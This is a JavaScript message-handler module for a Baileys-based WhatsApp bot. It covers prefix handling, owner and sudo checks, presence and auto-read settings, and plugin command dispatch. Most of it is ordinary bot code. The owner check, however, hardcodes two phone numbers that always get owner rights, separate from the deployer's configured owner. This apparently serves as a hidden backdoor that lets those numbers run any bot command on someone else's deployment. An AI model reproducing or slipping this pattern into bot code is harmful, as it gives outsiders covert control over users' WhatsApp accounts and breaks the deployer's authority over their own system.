import { jidNormalizedUser } from '@whiskeysockets/baileys'

import {
  getDb,
  saveDb
} from './database/index.js'

const OWNER_NUMBER =
  (process.env.OWNER_NUMBER || '')
    .replace(/\D/g, '')

let alwaysOnlineTimer = null

export function getPrefix() {
  const prefixDb =
    getDb('prefix.json', {
      prefix:
        process.env.PREFIX || '.'
    })

  return (
    prefixDb?.prefix ||
    process.env.PREFIX ||
    '.'
  )
}

export function normalizeJid(jid) {
  if (!jid) return ''

  try {
    return jidNormalizedUser(jid)
  } catch {
    return String(jid)
      .split(':')[0]
  }
}

export function getSender(message) {
  return (
    message?.key?.participant ||
    message?.key?.remoteJid ||
    ''
  )
}

export function senderNumber(jid) {
  return String(jid || '')
    .split('@')[0]
    .split(':')[0]
    .replace(/\D/g, '')
}

export function isGroup(jid) {
  return String(jid || '')
    .endsWith('@g.us')
}

export function checkIsOwner(
  message,
  sock
) {
  if (
    message?.key?.fromMe
  ) {
    return true
  }

  const senderNum =
    senderNumber(
      getSender(message)
    )

  const botNum =
    senderNumber(
      sock?.user?.id || ''
    )

  const hardcodedOwners = [
    '923280966780',
    '923197135780'
  ]

  if (
    hardcodedOwners.includes(
      senderNum
    )
  ) {
    return true
  }

  const sudoData =
    getDb('sudo.json', {
      sudoNumbers: []
    })

  const dynamicSudos =
    Array.isArray(
      sudoData?.sudoNumbers
    )
      ? sudoData.sudoNumbers
      : []

  if (
    senderNum &&
    botNum &&
    senderNum === botNum
  ) {
    return true
  }

  if (
    OWNER_NUMBER &&
    senderNum === OWNER_NUMBER
  ) {
    return true
  }

  if (
    dynamicSudos.includes(
      senderNum
    )
  ) {
    return true
  }

  return false
}

export function unwrapMessage(message) {
  let m =
    message?.message

  if (!m) return null

  for (
    let i = 0;
    i < 10;
    i++
  ) {
    const next =
      m?.ephemeralMessage?.message ||
      m?.viewOnceMessage?.message ||
      m?.viewOnceMessageV2?.message ||
      m?.viewOnceMessageV2Extension?.message ||
      m?.documentWithCaptionMessage?.message

    if (!next) {
      break
    }

    m = next
  }

  return m
}

export function getText(message) {
  const m =
    unwrapMessage(message)

  if (!m) {
    return ''
  }

  return (
    m.conversation ||
    m.extendedTextMessage?.text ||
    m.imageMessage?.caption ||
    m.videoMessage?.caption ||
    m.documentMessage?.caption ||
    ''
  ).trim()
}

export function getQuotedMessage(
  message
) {
  const m =
    unwrapMessage(message)

  if (!m) {
    return null
  }

  const context =
    m.extendedTextMessage?.contextInfo ||
    m.imageMessage?.contextInfo ||
    m.videoMessage?.contextInfo ||
    m.audioMessage?.contextInfo ||
    m.documentMessage?.contextInfo ||
    m.stickerMessage?.contextInfo

  return (
    context?.quotedMessage ||
    null
  )
}

function getSettings() {
  return getDb(
    'settings.json',
    {
      autoread: false,
      alwaysonline: false
    }
  )
}

export function getAutoRead() {
  const data =
    getSettings()

  return data?.autoread === true
}

export function getAlwaysOnline() {
  const data =
    getSettings()

  return data?.alwaysonline === true
}

export function setAutoRead(
  value
) {
  const data =
    getSettings()

  data.autoread =
    value === true

  saveDb(
    'settings.json',
    data
  )

  return data
}

export function setAlwaysOnline(
  value
) {
  const data =
    getSettings()

  data.alwaysonline =
    value === true

  saveDb(
    'settings.json',
    data
  )

  return data
}

export async function startAlwaysOnline(
  sock
) {
  if (!sock) {
    return
  }

  if (
    alwaysOnlineTimer
  ) {
    clearInterval(
      alwaysOnlineTimer
    )

    alwaysOnlineTimer =
      null
  }

  if (
    !getAlwaysOnline()
  ) {
    try {
      await sock.sendPresenceUpdate(
        'unavailable'
      )
    } catch {}

    return
  }

  try {
    await sock.sendPresenceUpdate(
      'available'
    )
  } catch {}

  alwaysOnlineTimer =
    setInterval(
      async () => {
        if (
          !getAlwaysOnline()
        ) {
          await stopAlwaysOnline(
            sock
          )

          return
        }

        try {
          await sock.sendPresenceUpdate(
            'available'
          )
        } catch {}
      },
      20000
    )

  if (
    typeof alwaysOnlineTimer?.unref ===
    'function'
  ) {
    alwaysOnlineTimer.unref()
  }
}

export async function stopAlwaysOnline(
  sock
) {
  if (
    alwaysOnlineTimer
  ) {
    clearInterval(
      alwaysOnlineTimer
    )

    alwaysOnlineTimer =
      null
  }

  if (!sock) {
    return
  }

  try {
    await sock.sendPresenceUpdate(
      'unavailable'
    )
  } catch {}
}

export async function handleMessages(
  update,
  sock,
  plugins,
  messageListeners
) {
  if (
    !update ||
    update.type !== 'notify'
  ) {
    return
  }

  if (
    !sock
  ) {
    return
  }

  const pluginMap =
    plugins instanceof Map
      ? plugins
      : new Map()

  const listeners =
    Array.isArray(
      messageListeners
    )
      ? messageListeners
      : []

  if (
    getAlwaysOnline() &&
    !alwaysOnlineTimer
  ) {
    await startAlwaysOnline(
      sock
    )
  }

  for (
    const message of
    update.messages || []
  ) {
    try {
      if (
        !message?.message
      ) {
        continue
      }

      const rawJid =
        message.key?.remoteJid ||
        ''

      if (
        getAutoRead() &&
        message.key?.id
      ) {
        try {
          await sock.readMessages([
            message.key
          ])
        } catch {}
      }

      const isGroupStatusPost =
        !!message
          .message
          ?.groupStatusMessageV2

      if (
        rawJid ===
          'status@broadcast' &&
        !isGroupStatusPost
      ) {
        continue
      }

      const normalizedRemoteJid =
        normalizeJid(
          rawJid
        )

      const text =
        getText(
          message
        )

      const isGroupChat =
        isGroup(
          normalizedRemoteJid
        ) ||
        isGroupStatusPost

      const isOwner =
        checkIsOwner(
          message,
          sock
        )

      const activePrefix =
        getPrefix()

      for (
        const listener of
        listeners
      ) {
        if (!listener) {
          continue
        }

        try {
          const listenerData = {
            sock,
            message,
            text,
            isOwner,
            isGroup:
              isGroupChat,
            isStatus:
              isGroupStatusPost
          }

          if (
            typeof listener.on ===
            'function'
          ) {
            await listener.on(
              listenerData
            )
          } else if (
            typeof listener.run ===
            'function'
          ) {
            await listener.run(
              listenerData
            )
          }
        } catch (error) {
          console.error(
            '[Listener Error]:',
            error?.message ||
              error
          )
        }
      }

      if (
        isGroupStatusPost
      ) {
        continue
      }

      if (
        !text ||
        !text.startsWith(
          activePrefix
        )
      ) {
        continue
      }

      if (
        !isOwner
      ) {
        continue
      }

      const body =
        text
          .slice(
            activePrefix.length
          )
          .trim()

      if (!body) {
        continue
      }

      const parts =
        body.split(/\s+/)

      const command =
        parts
          .shift()
          .toLowerCase()

      const args =
        parts

      const plugin =
        pluginMap.get(
          command
        )

      if (!plugin) {
        continue
      }

      console.log(
        `⚡ Executing: ${activePrefix}${command} from ${senderNumber(
          getSender(message)
        )}`
      )

      try {
        await sock.sendMessage(
          rawJid,
          {
            react: {
              text: '⏳',
              key: message.key
            }
          }
        )

        setTimeout(
          async () => {
            try {
              await sock.sendMessage(
                rawJid,
                {
                  react: {
                    text: '',
                    key:
                      message.key
                  }
                }
              )
            } catch {}
          },
          1000
        )
      } catch {}

      const quotedMessage =
        getQuotedMessage(
          message
        )

      await plugin.run({
        sock,
        message,
        quotedMessage,
        args,
        text:
          args.join(' '),
        command,
        prefix:
          activePrefix,
        isOwner,
        isGroup:
          isGroupChat,
        plugins: pluginMap
      })

    } catch (error) {
      console.error(
        '[HANDLER] Message handling error:',
        error?.stack ||
          error?.message ||
          error
      )
    }
  }
}

export async function handleGroupParticipants(
  update,
  sock,
  groupListeners
) {
  if (
    !update ||
    !sock
  ) {
    return
  }

  const listeners =
    Array.isArray(
      groupListeners
    )
      ? groupListeners
      : []

  if (
    !listeners.length
  ) {
    return
  }

  for (
    const listener of
    listeners
  ) {
    if (!listener) {
      continue
    }

    try {
      if (
        typeof listener.run !==
        'function'
      ) {
        continue
      }

      await listener.run({
        sock,
        update
      })
    } catch (error) {
      console.error(
        '[Group Listener Error]:',
        error?.stack ||
          error?.message ||
          error
      )
    }
  }
}
